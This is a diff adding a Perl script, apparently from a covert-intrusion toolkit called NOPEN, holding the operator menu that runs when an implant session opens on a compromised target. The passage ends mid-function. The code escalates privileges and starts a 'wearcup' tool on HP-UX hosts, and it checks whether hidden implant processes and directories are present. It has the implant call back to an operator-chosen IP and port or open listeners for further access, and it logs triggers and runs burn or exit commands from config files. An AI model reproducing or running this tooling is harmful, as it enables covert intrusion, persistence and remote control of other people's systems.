@@ -1,0 +1,987 @@
+#!/usr/bin/env perl
+#
+# 20090413 - This script contains nothing except the menu code that
+# is presented when the first NOPEN session is opened on a target.
+#
+$VER="2.2.1.3" ;
+$ext = $$ ; 			# limits likelihood of concurrent autodone's colliding
+            			# BUT: still possible.
+            			# not too likely to happen.
+myinit() ;
+
+# Global variables, used to control program flow (for now).
+my $startnewdone=0;
+#my $startshortnewdone=0;
+my $retrycb=0;
+
+# local_firewall($nopen_autoport);
+my @autoargv = ();
+mydo("autoscriptcheck",@autoargv);
+mydo("autosessioninit",@autoargv);
+
+# In sub dospecial, if config files contain these commands we
+# use mydo() instead of doit().
+%specialcommands = (
+		 "-lss","autolss",
+		 "-gs lss","autolss",
+		);
+%mydocommands = (
+		 "-ctrl","autostoicctrl",
+		 "-gs stoicctrl","autostoicctrl",
+		 "-gs dfcheck","autodfcheck",
+		 "=dfcheck","autodfcheck",
+		);
+
+#$hpuxtarget = $nopen_serverinfo =~ /HP-UX/
+#  unless $hpuxtarget;
+  
+#$routertarget = $nopen_serverinfo =~ /IOS/i
+#  unless $routertarget;
+
+# Age of this file means we may do it again (if > 0.9 see autorunonce)
+my $lastdone = -M "$optmp/autonewdone.$nopen_rhostname";
+rename("$optmp/autonewdone.$nopen_rhostname","$optmp/autonewdone.$nopen_rhostname.REDONE")
+  if ($lastdone > 23/24); # Redo at almost one day old
+
+$show = 0;
+$show = 1
+  unless (-e "$optmp/autonewdone.$nopen_rhostname");
+$show = 1
+  if (-e "$optmp/autonewdone.$nopen_rhostname.AGAIN");
+unlink("$optmp/autonewdone.$nopen_rhostname.AGAIN");
+
+logtrigger();
+
+#my $suppresscup = 0 if $hpuxtarget;
+if ($autoforce or
+    $autoyes or
+    $showmenu or
+    $autoreget or
+    ($redo or !(-e "$optmp/autonewdone.$nopen_rhostname" or -e "$optmp/autodont"))
+   ) {
+  $show = 1;
+}
+
+# We always run this, $show=1 is special case with menu.
+dorunonce($show);
+
+#if ($hpuxtarget and (!$suppresscup and (-e "$opdown/$nopen_rhostname.cup.sleep.kills"))) {
+#  # Show the contents of $opdown/$nopen_rhostname.cup.sleep.kills so that we see it.
+#  myalert("Previous invocation of wearcup detected!");
+#  doit("-lsh -nohist echo ; tail -10 $opdown/$nopen_rhostname.cup.sleep.kills");
+#}
+
+
+# dospecial($dowhat) does nothing unless:
+# 1) both gs.$dowhat and auto$dowhat are there; or
+# 2) $opdown/special.$dowhat.cfg exists, a config file with syntax to be determined
+# NOTE: If $dowhat contains an IP (with _ for each dot), it must be ours to process it.
+#
+foreach (sort keys %ENV) { # done in alpha order
+# E.g., use export before connecting or -lsetenv while connected, then -gs auto:
+#                   export   NOPENFIRSTTASK=something
+#		    -lsetenv NOPENMAINTASK=yada
+#		    export   NOPENXLASTTASK=note
+#                   export   NOPENTASK10_10_0_1="Task for 10.10.0.1"
+  next unless (/^NOPEN.*TASK/ and length($ENV{$_}) > 0);
+  dospecial($_);
+}
+dospecial($nopen_myip);
+
+
+# End with true value as we require this script elsewhere.
+1;
+#ENDMAIN
+
+sub dorunonce {
+    local($myshow) = (@_);
+    #  offerabort("in TOP OF autorunonce, show=$show= for $nopen_rhostname");
+    # Before we do anything else, be sure to -elevate then run wearcup on HP-UX.
+    my $dohpuxelevate = ! -f "$optmp/NOHPUXELEVATE";
+    if ($hpuxtarget and $dohpuxelevate) {
+	my ($unelevatedls,$unnopen,@unelevatedls,
+	    $unelevatedps,$unnopen2,@unelevatedps,
+	    $elevatedls,$nopenlines,@elevatedls,
+	    $elevatedps,$unnopen2,@elevatedps,
+	    $oldcupkills,@onceoutput,
+	    ) = ();
+	if (-e "$opdown/$nopen_rhostname.cup.sleep.pids") {
+	    my ($sleeppid,$shellpid) = ();
+	    if (open(ONCEIN,"$opdown/$nopen_rhostname.cup.sleep.pids")) {
+		while (<ONCEIN>) {
+		    ($sleeppid,$shellpid) = /(\d+),(\d+)/;
+		}
+		close(ONCEIN);
+	    }
+	    preservefile("$opdown/ps-cupcheck.$nopen_rhostname");
+	    my ($output,$nopenlines,@output) = doit("=ps >L:$opdown/ps-cupcheck.$nopen_rhostname");
+	    if (open(ONCEIN,"$opdown/ps-cupcheck.$nopen_rhostname")) {
+		@onceoutput = <ONCEIN>;
+		close(ONCEIN);
+	    }
+	    @onceoutput = grep / ($shellpid\s*1|$sleeppid\s*$shellpid) /,@onceoutput;
+	    # We set aside old cup.sleep.* files if that cup no longer running,
+	    # so below we WILL run a fresh cup.
+	    if (@onceoutput) {
+		if (open(ONCEIN,"$opdown/$nopen_rhostname.cup.sleep.kills")) {
+		    while(<ONCEIN>) {
+			$oldcupkills .= $_;
+		    }
+		    close(ONCEIN);
+		}
+	    } else {
+		preservefile("$opdown/$nopen_rhostname.cup.sleep.pids",
+			     "$opdown/$nopen_rhostname.cup.sleep.kills",
+			     );
+	    }
+	}
+	
+	# We only do the cd /dev stuff once per target
+	unless (-s "$opdown/ps-in-dev.$nopen_rhostname") {
+	    preservefile("$opdown/ps-in-dev.$nopen_rhostname");
+	    ($unelevatedls,$unnopen,@unelevatedls) = doit("cd /dev ; ls -alrt /lost+found",);
+	    ($unelevatedps,$unnopen2,@unelevatedps) =
+		doit("cd /dev ; ps -ef > L:$opdown/ps-in-dev.$nopen_rhostname",
+		     "-lsh grep memlogd $opdown/ps-in-dev.$nopen_rhostname",
+		     );
+	}
+	# Unless disabled, we do the -elevate in EVERY hpux window, and BEFORE we wearcup
+	doit("-elevate");
+	unless (-s "$opdown/unelevated.ls-ps.$nopen_rhostname") {
+	    ($elevatedls,$nopenlines,@elevatedls) = doit("ls -alrt /lost+found",);
+	    if (open(RUNOUT,">$opdown/unelevated.ls-ps.$nopen_rhostname")) {
+		print RUNOUT "$unnopen\n$unelevatedls\n".
+		    "$unnopen2\n$unelevatedps\n";
+		close(RUNOUT);
+	    }
+	}
+	unless (-s "$opdown/ps-elevated.$nopen_rhostname") {
+	    preservefile("$opdown/ps-elevated.$nopen_rhostname");
+	    ($elevatedps,$unnopen2,@elevatedps) =
+		doit("ps -ef > L:$opdown/ps-elevated.$nopen_rhostname",
+		     "-lsh grep memlogd $opdown/ps-elevated.$nopen_rhostname",
+		     );
+	    if (open(RUNOUT,">$opdown/elevated.ls-ps.$nopen_rhostname")) {
+		print RUNOUT "$nopenlines\n$elevatedls\n".
+		    "$unnopen2\n$elevatedps\n";
+		close(RUNOUT);
+	    }
+	}
+	if (@elevatedps) {
+	    @elevatedps   = grep /memlogd/,@elevatedps;
+	    @unelevatedps = grep /memlogd/,@unelevatedps;
+	    #    @elevatedls   = grep /drwx/,@elevatedls;
+	    #    @unelevatedls = grep /drwx/,@unelevatedls;
+	    @elevatedls   = grep /drwx.*3d9892354a360245add0f483f269f384/,@elevatedls;
+	    @unelevatedls = grep /drwx.*3d9892354a360245add0f483f269f384/,@unelevatedls;
+	    my $more = "";
+	    my $morels = "and a 3d9892354a360245add0f483f269f384 directory that is hidden when in /dev,\n"
+		if (@elevatedls > @unelevatedls);
+	    
+	    if (@elevatedps > @unelevatedps) {
+		$more = "There are more elevated memlogd processes than unelevated,\n".
+		    $morels.
+		    "so you are on an implanted target.";
+	    } else {
+		$more = "There is a directory that is hidden when in /dev,\n".
+		    "so you are on an implanted target.";
+	    }
+	    if (!$more) {
+		mygetinput(".$COLOR_FAILURE\n\n".
+			   "You are on an HPUX target. Above, ls/ps checks were done, before -elevate\n".
+			   "in /dev and and after -elevate not in /dev.\n\n".
+			   "Please take note and hit return continue.\n".
+			   "");
+	    } else {
+		progprint(".$COLOR_FAILURE\n\n$more\n\n".
+			  "You are on an HPUX target. Above, ls/ps checks were done, before -elevate\n".
+			  "in /dev and and after -elevate not in /dev.\n\n".
+			  "");
+	    }
+	}
+	my $delay = 5;
+	if (-e "$opdown/$nopen_rhostname.cup.sleep.pids") {
+	    progprint(".\n\nPrevious copy of cup is still active:\n\n".
+		      $oldcupkills."\nCUP Processes just seen in above =ps\n".
+		      "(complete =ps in $opdown/ps-cupcheck.$nopen_rhostname):\n".
+		      join("",@onceoutput)."\n".
+		      "$prog will continue in $delay seconds.....".
+		      "");
+	    sleep $delay;
+	} else {
+	    # We start with a default 3 hour wearcup. You can change it easily enough by re-invoking.
+	    mydo("autowearcup","-w3h");
+	}
+    } elsif ($hpuxtarget and !$dohpuxelevate) {
+	# Warn about no cup yet
+	mywarn("\n\n".
+	       "This HPUX target still has no wearcup run because this file exists:\n".
+	       `ls -al $optmp/NOHPUXELEVATE`."\n\n".
+	       "At least one window on $nopen_rhostname must be connected after\n".
+	       "removing that file".
+	       "");
+	sleep 10;
+    }
+    # endif ($hpuxtarget and $dohpuxelevate)
+    
+    # If we're on a router, don't do squat.
+    if ($routertarget) {
+	my ($ans) = mygetinput
+	    ("This appears to be a Cisco router. \"autonewdone\" cannot be run on routers safely.\n\n".
+	     $COLOR_FAILURE.
+	     "ONLY CONTINUE HERE IF YOU ARE SURE THIS IS NOT A ROUTER.\n\n".
+	     $COLOR_NORMAL.
+	     "<S>kip autonewdone on this router, or <C>ontinue with autonewdone, (this is not a router).",
+	     "S","C",
+	     );
+	if ($ans eq "S") {
+	    myalert("Aborting \"autonewdone\" PERMANENTLY for router $nopen_rhostname.");
+	    $myshow = 0;
+	    system("touch $optmp/autonewdone.$nopen_rhostname");
+	}
+    }
+    elsif ($myshow) {
+	# Check for any concurrent runs.
+	dbg("in autorunonce, checking for concurrent runs");
+	my @pids = lookupnopenpids(1, $nopen_rhostname);
+	foreach my $pid (@pids) {
+	    $myshow = 0 if ( -e "$optmp/autonewdone.INPROGRESS.$pid");
+	    #dbg("in autorunonce, myshow = =$myshow= show=$show= for pid = =$pid=");
+	}
+    }
+    #dbg("in autorunonce, myshow = =$myshow= show=$show= for pid = =$pid=");
+#  offerabort("in autorunonce, show=$show= for $nopen_rhostname");
+#  offerabort("WTF0");
+    
+    # Check for the keepalive hostvar and set it if needed.
+    if ($host_keepalive or $gbl_nopenkeepalive) {
+      my $delay = 180;
+      $delay = $gbl_nopenkeepalive if ($gbl_nopenkeepalive > 5);
+      $delay = $host_keepalive if ($host_keepalive > 5);
+      progprint("Setting keepalives for $delay second intervals\n");
+      doit("-keepalive -vv $delay");
+    }
+
+    showmenu() if $myshow;
+
+################################################
+# BEGIN SPECIAL MANUAL FOR REMI OP
+################################################
+
+#doit("-find /") unless (-f "$opdown/cmdout/$nopen_rhostname-find");
+
+#doit("-ls /private/tmp/crond",
+#     "-rm ../../../../../../private/tmp/crond",
+#    );
+
+
+################################################
+# END SPECIAL MANUAL FOR REMI OP
+################################################
+
+    return 1;
+}#dorunonce
+    
+sub showmenu {
+  my $port = myrand() ;
+  my @choices = ("P","O","A","C","D","X");
+  push(@choices,"K") if ($serverver ge "3.2.0.0");
+
+  my $maindefault = "P";
+  my @callbackchoices = ("P","O","A","R","C");
+  my $callbackdefault = "P";
+
+  my $doextra = "";
+
+  my ($shortextra,$shortextra2,$linuxextra) = ();
+
+ MAIN:
+  while (1) {
+      if ($junostarget) {
+	  $doextra = ".junos";
+      }
+      else {
+	  $shortextra = "\n   S) NOPEN will not callback--run the \"short\" version of autonewdone.";
+	  $shortextra2 = 
+	      "\n   NOTE: Only run the \"short\" version of autonewdone when you are allowed to\n".
+	      "         do so. DON'T run it every time you get onto this host!\n";
+	  push(@choices,"S");
+      }
+      
+      my ($porkextra,$porkextra2) =();
+      my $pschain = `pschain $nopen_mypid`;
+      my $porkused = $pschain =~ /noclient -i \d+/;
+      my $porktarget = $nopen_myip;
+      if ($pschain =~ /\.\/porkclient.*-\i\s(\S+).*/) {
+	  $porktarget = $1;
+      }
+      if ($porkused and !(-e "$optmp/Porklisten.$nopen_rhostname")) {
+	  dbg("in autorunonce, porkused = =$porkused=, porktarget = =$porktarget=");
+	  @choices = ("L",@choices);
+	  $porkextra = "\n   L) Start a NOPEN listener, then run autonewdone$doextra.";
+	  $porkextra2= "$COLOR_FAILURE\n".
+	      "NOTE\a: You got here with PORK so this is your one and only possible window\n".
+	      "thus far, and has no listener yet.$COLOR_NORMAL To get a second window you must\n".
+	      "either start a listener or do a callback (if your target permits it).\n\n".
+	      "The default will start a listener on a random port:    noclient $porktarget:$port\n";
+	  $porkextra2 .= "                                                       -nstun $porktarget:$port\n\n"
+	      unless ($porktarget =~ /127.0.0.1/);
+      }
+      for my $str ("FORCE",
+		   "-f",
+		   "-F",
+		   "-FORCE",
+		   ) {
+	  if (-f "$optmp/autonewdone.$nopen_rhostname.$str" or
+	      -f "$optmp/autonewdone.ALL.$str") {
+	      unlink("$optmp/autonewdone.$nopen_rhostname.$str");
+	      $autoforce = "FORCE";
+	  }
+      }
+      if ($autoyes or $autoforce or 
+	  $gbl_nopromptsplease or $host_nopromptsplease or
+	  -f "$optmp/autonewdone.$nopen_rhostname.YES" or
+	  -f "$optmp/autonewdone.ALL.YES"
+	  ) {
+	  $startnewdone=1;
+	  unlink("$optmp/autonewdone.$nopen_rhostname.FORCE");
+	  $ans = "p";
+      } else {  
+	  if ($autoyes) {
+	      $ans = lc $maindefault;
+	  } else {
+	      my $kmore = "\n   K) Configure a keepalive interval for this and future NOPEN sessions for this target." if ($serverver ge "3.2.0.0");
+	      ($ans,$longans) = mygetinput
+		  (`ls -alrt $optmp/autonewdone.$nopen_rhostname* 2>/dev/null`.
+		   "${COLOR_FAILURE}
+autorunonce v.$VER   autoyes=$autoyes= autoforce=$autoforce= autoreget=$autoreget= autoshort=$autoshort=
+
+Ready to run \"autonewdone$doextra\" commands. This could take a while to run.\a$COLOR_NORMAL
+
+Choices:
+$porkextra
+   P) Proceed--NOPEN will not callback and this window will be busy for a while.$shortextra
+   O) Use the OTHER/new autonewdone.main$doextra instead.
+   C) Have NOPEN callback to give you another window, then run autonewdone.
+   A) Abort autonewdone$doextra for this window/session.
+   D) Abort autonewdone$doextra PERMANENTLY for every NOPEN window on this host.$kmore
+   X) Secondary menu options, sets platform sub-variables then returns here.
+
+   NOTE: Only choose \"D\" if you know this host has already been done (perhaps
+         under a different IP?), or you DO NOT WANT it done, AND DO NOT want it
+         done later.  AND, you'd better have a REALLY good reason...
+$shortextra2
+$porkextra2
+Choose from above:",$maindefault,@choices);
+	  }
+      }
+      if ($ans eq "x") {
+	  if ($linuxtarget) {
+	      ($ans,$longans) = mygetinput("${COLOR_FAILURE}
+autorunonce Secondary Menu for remote end: $nopen_serverinfo
+
+Choose one, after which you will be sent to the previous menu:
+
+   F) Switch to Fortigate firewall (Linux) mode
+   S) Switch to Some-other firewall (Linux) mode
+   D) Do nothing (return to previous menu)
+
+Choose from above:","D","F","S",);
+	      if ($ans eq "d") {
+		  $doextra = ".linux-fw-fortigate";
+	      } elsif ($ans eq "F") {
+		  $doextra = ".linux-fw-someother";
+              }
+	      next MAIN;
+	  } else {
+	      progprint("$COLOR_FAILURE\n\n".
+			"There are no eXtra menu options for $nopen_serverinfo...");
+	      sleep 2;
+	      next MAIN;
+	  }
+      } elsif ($ans eq "k") {
+	  my ($interval) = $longans =~ /(\d+)/;
+          (undef,$interval) =
+	      mygetinput("Enter a keepalive interval for this and future NOPEN sessions".
+			 "on this target (in seconds):","-A",$interval)
+	      unless ($interval > 0);
+	  if ($interval > 0 and $interval <= 600) {
+	      my ($output) = doit("-keepalive $interval");
+	      # Save this to a hostvar for later use.
+	      newhostvar("host_keepalive",$interval)
+		  if ($output and $output !~ /No such builtin/);
+	  } else {
+	      mywarn("Ignoring invalid interval: $interval, must be between 1 and 600 seconds");
+	      sleep 2;
+	  }
+          next MAIN;
+      } elsif ($ans eq "l") {
+	  (undef,$port) = mygetinput("Choose a port to listen on:",$port);
+	  #dbg("in autorunonce, PORK listen port = =$port=?");
+	  doit("-listen $port") if (!($port eq 0) or !($port > 65535));
+	  # For now we write to .new file. The mv below makes the next sessioninit
+	  # see and try to confirm this port.
+	  if (open(DIDTHIS,"> $optmp/Porklisten.$nopen_rhostname.new")) {
+	      print DIDTHIS $port ;
+	      doit("-lsh -nohist mv $optmp/Porklisten.$nopen_rhostname.new $optmp/Porklisten.$nopen_rhostname");
+	  }
+	  close(DIDTHIS);
+	  if (open(DIDTHIS,"+< $opdown/didthis")) {
+	      my ($toip,$fromwhere) = ();
+	      while (<DIDTHIS>) {
+		  next if $_ eq "\n";
+		  ($fromwhere,$toip) = /From (.+) to (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/;
+	      }
+	      my $how = "noclient";
+	      $how = "-nstun" if ($fromwhere ne "command line");
+	      print DIDTHIS "# PORK session so autorunonce v$VER started listener at $port per user\n";
+	      print DIDTHIS "$how $nopen_myip:$port\n\n";
+	      close(DIDTHIS);
+	  }
+	  
+	  offerabort("NOPEN listener was started at port $port. Proceed with autonewdone?");
+	  $startnewdone=1;
+      } elsif ($ans eq "c") {
+	RETRY: my $dofirst = "";
+	  chomp($didthis = `grep noclient.*$nopen_myip $opdown/didthis 2>/dev/null | grep -v "^#"`) ;
+	  my $defip = $local_ip if $didthis ;
+	  unless ($didthis) {
+	      $defip = "A";
+	  }
+	  my $looped=0;
+	  while (1) {
+	      progprint("Invalid IP",$COLOR_FAILURE) if $looped ;
+	      (undef,$ip) = mygetinput("To what IP (or Abort)?",$defip);
+	      last if ($ip =~ /^a/i) ;
+	      $looped++ ;
+	      #dbg("in autorunonce, ip =$ip=, looped = =$looped=");
+	      last if (ipcheck($ip)) ;
+	  }
+	  my ($noclientline,$atip) = () ;
+	  unless ($ip =~ /a/i) {
+	      (undef,$port) = mygetinput("To what port?",$port);
+	      #dbg("in autorunonce, port = =$port=?");
+	      $dofirst = "-call $ip $port" ;
+	      if ($ip eq $local_ip) {
+		  $noclientline = "noclient -l $port\n\n" ;
+	      } else {
+		  $noclientline = "-nrtun $port\n\n" ;
+		  $atip = " (at correct IP: $ip)" ;
+	      }
+	  }
+	  
+	  while(1) {
+	      my $myans = "";
+	      offerabort("${noclientline}Get that listener started$atip and press Enter when ready.");
+	      
+	      doit($dofirst);
+	      unless ($autoyes) {
+		  ($myans,$longans) = mygetinput("${COLOR_FAILURE}
+Callback initiated. Proceed with autonewdone$doextra?\a$COLOR_NORMAL
+
+Choices:
+   P) Proceed with autonewdone$doextra in this window.
+   O) Use the OTHER/new autonewdone.main$doextra instead.
+   A) Abort (either your callback failed, or you changed your mind).
+   R) Retry (you messed up your arguments, perhaps?)
+   C) Continue to a NOPEN prompt; don't run autonewdone$doextra in this window.
+
+Choose from above:",$callbackdefault,@callbackchoices);
+	      } else {
+		  $myans = lc $callbackdefault;
+	      }
+	      if ($myans =~ /^p/i) {
+		  $ans = $myans;
+		  progprint("${COLOR_FAILURE}PROCEEDING${COLOR_NORMAL} with autonewdone$doextra");
+		  $startnewdone=1;
+		  #dbg("in autorunonce, startnewdone = =$startnewdone=");
+		  # Verify that the callback succeeded.
+		  # FIXME: this code needs to exist...
+		  last;
+	      }
+	      elsif ($myans =~ /^o/i) {
+                  $ans = $myans;
+                  progprint("${COLOR_FAILURE}PROCEEDING${COLOR_NORMAL} with autonewdone.main$doextra");
+                  $altstartnewdone=1;
+                  #dbg("in autorunonce, altstartnewdone = =$altstartnewdone=");
+                  last;
+              }
+	      elsif ($myans =~ /^r/i) {
+		  $retrycb = 1;
+		  #dbg("in autorunonce, retrycb = =$retrycb=");
+	      }
+	      else {
+		  $startnewdone=0;
+		  $retrycb = 0;
+		  #dbg("in autorunonce, startnewdone = =$startnewdone= with ans = =$ans=");
+		  last;
+	      }
+	      
+	      if ($retrycb) {
+		  #dbg("in autorunonce, returning to cb start,retrycb = =$retrycb=");
+		  last;
+	      }
+	  } #while
+	  if ($retrycb) {
+	      $retrycb = 0;
+	      goto RETRY;
+	  }
+      } #elsif ($ans =~ /^c/i)
+      
+      if ($ans =~ /^[ad]/i) {
+	  my $more = "" ;
+	  if ($ans =~ /^d/i) {
+	      $more = " PERMANENTLY for $nopen_rhostname!" ;
+	      system("touch $optmp/autonewdone.$nopen_rhostname");
+	  }
+	  progprint("ABORTING autonewdone$doextra$more",$COLOR_FAILURE);
+	  $startnewdone=0;
+      }
+      elsif ($ans =~ /^p/i) {
+	  $startnewdone=1;
+      }
+      elsif ($ans =~ /^o/i) {
+	  progprint("${COLOR_FAILURE}PROCEEDING${COLOR_NORMAL} with autonewdone.main$doextra");
+	  $altstartnewdone=1;
+	  #dbg("in autorunonce, altstartnewdone = =$altstartnewdone=");
+      }
+      elsif ($ans =~ /^s/i) {
+	  $autoshort = "MENU";
+      }
+
+      push(@autoargv,$autoreget)
+	  if ($autoreget);
+      
+      push(@autoargv,$autoforce)
+	  if ($autoforce);
+      
+      push(@autoargv,$autoyes)
+	  if ($autoyes);
+      
+      push(@autoargv,"TODAY")
+	  if ($today);
+      
+      push(@autoargv,"THISMONTH")
+	  if ($thismonth);
+      
+      if ($autoshort) {
+	  # Run the "short" version of autonewdone.
+	  mydo("autonewdone$doextra.short",@autoargv);
+      } elsif ($altstartnewdone) {
+          # Run the desired autonewdone now
+          mydo("autonewdone.main$doextra",@autoargv);
+      } elsif ($startnewdone) {
+	  # Run the desired autonewdone now
+	  mydo("autonewdone$doextra",@autoargv);
+      }
+      last;
+  }
+  return 1;
+}#showmenu
+
+sub logtrigger {
+  my $oldtrigger = $host_trigger{$nopen_myip};
+  my $latesttrigger = $gbl_trigger;
+  my ($default,$ans,$which) = ();
+  my @choices = ();
+  @choices = ($latesttrigger)
+    if ($latesttrigger and ! $host_notmytrigger{$latesttrigger});
+  @choices = ($gbl_trigger{$nopen_myip})
+    if $gbl_trigger{$nopen_myip};
+  foreach my $trigger (values %gbl_trigger) {
+    push(@choices,$trigger)
+      unless ($host_notmytrigger{$trigger});
+  }
+  # Nothing to log? Just return
+  return unless @choices;
+  @choices = uniqify_array(@choices);
+  # Same as previous log? Just return
+  if ($host_trigger{$nopen_myip} and
+      $host_trigger{$nopen_myip} eq $choices[0]) {
+    # We clear these for the next guy
+    newhostvar("gbl_trigger","CLEARALLMATCHING");
+    return;
+  }
+  # ASSERT: We have one or more new triggers to maybe log
+  if ($host_trigger{$nopen_myip}) {
+    my ($prompt1,@answers) = ("");
+    # Different this time? Gotta prompt
+    @choices = uniqify_array(@choices,$host_trigger{$nopen_myip});
+    my %triggernums = ();
+    for ($i = 0; $i < @choices; $i++) {
+      $triggernums{$choices[$i]} = $i+1;
+    }
+    my $i = 1;
+    while ($i <= @choices) {
+	if ($choices[$i-1]) {
+	    push(@answers,$i);
+	    $prompt1 .= sprintf("%5s: %s\n",$i,$choices[$i-1]);
+	}
+	$i++;
+    }
+    $prompt1 .= " NONE: None of the above\n";
+    $default = "NONE";
+    if ($choices[0] =~ /\s$nopen_myip($|\s)/) {
+      $default = "1";
+    } 
+    # Preference given toward non-ourtn triggers--pitches are the exception.
+    if (($default eq "NONE" or $choices[0] =~ /ourtn/) and
+         $choices[1] =~ /\s$nopen_myip($|\s)/) {
+      $default = "2";
+    }
+    ($ans,$longans) = mygetinput
+      (
+       "The host you are on, $nopen_rhostname, was\n".
+       "previously logged as using trigger #$triggernums{$host_trigger{$nopen_myip}} below, ".
+       "which is$COLOR_FAILURE DIFFERENT$COLOR_NORMAL than the\n".
+       "other one(s) below, which was used recently (perhaps to another target).\n\n".
+       $prompt1."\n\n".
+       "Which is the right trigger to log for this host ($nopen_myip), or is\n".
+       "NONE of these correct?",$default,@answers,"NONE",
+      );
+    if ($ans eq "n") {
+      newhostvar("host_trigger{$nopen_myip}","");
+      foreach my $trigger (@choices) {
+	  next unless (length $trigger);
+	  newhostvar("host_notmytrigger{$trigger}",1);
+      }
+    } elsif (length $choices[$ans-1]) {
+      newhostvar("host_trigger{$nopen_myip}",$choices[$ans-1]);
+      foreach my $trigger (@choices) {
+	  next unless (length $trigger);
+	  next if ($trigger eq $choices[$ans-1]);
+	  next if ($trigger =~ /\s$nopen_myip($|\s)/);
+	  newhostvar("host_notmytrigger{$trigger}",1);
+      }
+    }
+  } else {
+    # No previous trigger for this guy, log our first/only choice
+    $ans = "y";
+    unless ($choices[0] =~ /\s$nopen_myip($|\s)/) {
+      ($ans) = mygetinput
+        (
+         "The host you are on, $nopen_rhostname, does\n".
+         "not yet have any trigger associated with it.\n\n".
+         "The trigger below was used recently but does$COLOR_FAILURE NOT$COLOR_NORMAL contain this host's IP:\n\n".
+         "      $choices[0]\n\n".
+         "Is this the correct trigger for this host ($nopen_myip)?","N"
+        );
+      newhostvar("host_notmytrigger{$choices[0]}",1);
+    }
+    newhostvar("host_trigger{$nopen_myip}",$choices[0]) if ($ans eq "y");
+  }
+  newhostvar("gbl_trigger","CLEARALLMATCHING")
+    if ($ans ne "n" and $host_trigger{$nopen_myip} eq $gbl_trigger);
+}
+
+sub dospecial {
+  local ($dowhat) = (@_);
+  $dowhat = $ENV{"$dowhat"}
+    if  $ENV{"$dowhat"};
+  my $dofile = "$opdown/special.$dowhat.cfg";
+  my ($gsfile,$autofile) = 
+    ("$opetc/gs.$dowhat",
+     "$opetc/auto$dowhat"
+    );
+
+  foreach ($gsfile,$autofile,"$opdown/special.$dowhat.cfg") {
+    next unless -f $_;
+    `dos2unix $f 2>&1`;
+  }
+  # $dowhat may be IP specific, return if not ours
+  my ($doip) = $dowhat =~ /[\.,_](\d{1,3}[\.,_]\d{1,3}[\.,_]\d{1,3}[\.,_]\d{1,3})/;
+  ($doip) = $dofile =~ /[\.,_](\d{1,3}[\.,_]\d{1,3}[\.,_]\d{1,3}[\.,_]\d{1,3})/
+    unless ($doip);
+  ($doip) = $ENV{$dowhat} =~ /[\.,_](\d{1,3}[\.,_]\d{1,3}[\.,_]\d{1,3}[\.,_]\d{1,3})/
+    unless ($doip);
+  $doip =~ s/[_,]/./g;
+dbg("doip=$doip= dowhat=$dowhat");
+  if ($doip and (!$nopen_myip eq $doip)) {
+dbg("RETURNING since no match: nopen_myip=$nopen_myip= and doip=$doip=");
+    return;
+  }
+
+  # ASSERT: In SPECIAL mode with config file $dofile
+  # Ideas for config file syntax:
+  # Line that indicates stay in loop, run once every ## seconds:   LOOP=N
+  # Line that indicates host to run as
+  my ($dodir,$doname) = (dirname($dofile),
+			 basename($dofile));
+  my (%doitcommands,%mydoargs,@doitlast) = ();
+  my ($repeatcount,$content) = (1,"#LINE(CMDCOUNT):CMD\n");
+  my ($gotinfinite,
+      $gotburn,
+      $repeatall,
+      $sleepbetween,
+      $stopfile,
+     ) = ();
+dbg("dofile=$dofile=");
+  if (open(SPECIALIN,$dofile)) {
+    $linenum = 1;
+    while (my $thisline = <SPECIALIN>) {
+      $thisline =~ s,[\r\n]*$,,g;
+      $thisline =~ s/^\s*//;
+      if (my ($c,$sign,$cmd) = $thisline =~
+	  /^NOPEN_DO( (-){0,1}\d+){0,1}\s*:\s*(.*)/) {
+	if ($gotinfinite or $gotburn) {
+	  mydie("BAD SPECIAL config.\n\n".
+		"Any -exit, \\-burnBURN or infinitely run command must be the last one.");
+	}
+	$gotinfinite++ if $sign;
+	my $count = int($c);
+	$count = 1 unless (length $c);
+	dbg("LINEPARSE: c=$c= sign=$sign= cmd=$cmd= gotinfinite=$gotinfinite= count=$count=");
+	my ($cmdname,$cmdargs) = $cmd =~ m/^(\S+)\s*(.*)/;
+	my $oldcmd = $cmd;
+	if ($cmd =~ s,^-gs\s+,,) {
+	  ($cmdname,$cmdargs) = $cmd =~ m/^(\S+)\s*(.*)/;
+	  $cmdname = "-gs $cmdname";
+	  #offerabort
+	  dbg("CHANGED from oldcmd=$oldcmd= to cmd=$cmd= NOW HAVE cmdname=$cmdname= cmdargs=$cmdargs=");
+	}
+	if ($mydocommands{$cmdname} or $specialcommands{$cmdname}) {
+	  $cmd = "mydo($mydocommands{$cmdname},$cmdargs)";
+	  $mydoargs{$linenum} = $cmdargs;
+	  if ($specialcommands{$cmdname}) {
+	    if ($cmdname =~ /lss/) {
+	      $cmd = "nopenlss($cmdargs)";
+	      #offerabort
+	      dbg("DBG:  Got lss
+cmd=$cmd=
+cmdname=$cmdname=
+cmdargs=$cmdargs=
+thisline=$thisline=
+");
+	    }
+	  } else {
+	      #offerabort
+	      dbg("DBG Got a mydo: cmd=$cmd= cmdname=$cmdname= cmdargs=$cmdargs= gs=$gs=");
+	  }
+	} else {
+	    #offerabort
+	    dbg("DBG: NO mydo here: $thisline cmdname=$cmdname= cmd=$cmd= gs=$gs= count=$count= sign=$sign=");
+
+	}
+	$content .= sprintf("\#%03d(%04d):$thisline\n",$linenum,$count);
+	if ($cmd eq "\\-burnBURN" or $cmd eq "-exit") {
+	  $gotburn++;
+	  push(@doitlast,$cmd);
+	} else {
+	  $doitcommands{$linenum} = $cmd;
+	  $doitcount{$linenum} = $count;
+	}
+      } elsif ($thisline =~ /^\s*SLEEP:\s*(\d+)/) {
+	$sleepbetween = int($1) if (int($1) > 0);
+	$content .= sprintf("\#%03d(NOOP):$thisline\n",$linenum);
+      } elsif ($thisline =~ /^\s*REPEAT\s*\d*:\s*YES/) {
+	($repeatall,$which) =
+	  $thisline =~  /^\s*REPEAT(\s*\d+){0,1}\s*:\s*(\S+)/;
+	$repeatall = -1 unless $repeatall;
+	$content .= sprintf("\#%03d(NOOP):$thisline\n",$linenum);
+      } elsif ($thisline =~ m,^\s*STOPFILE:\s*(\S+),) {
+	$stopfile = $1;
+	$stopfile = "$optmp/STOPFILE.$stopfile" unless ($stopfile =~ m,^/,);
+	$content .= sprintf("\#%03d(NOOP):$thisline\n",$linenum);
+	if (-f $stopfile) {
+	  offerabort("STOPFILE $stopfile already exists, it will be wiped unless you abort");
+	  unlink($stopfile);
+	}
+      } else {
+	$content .= sprintf("\#%03d(NOOP):$thisline\n",$linenum);
+      }
+      $linenum++;
+    }
+    close(SPECIALIN);
+    if (($gotinfinite or $gotburn) and $repeatall < 0) {
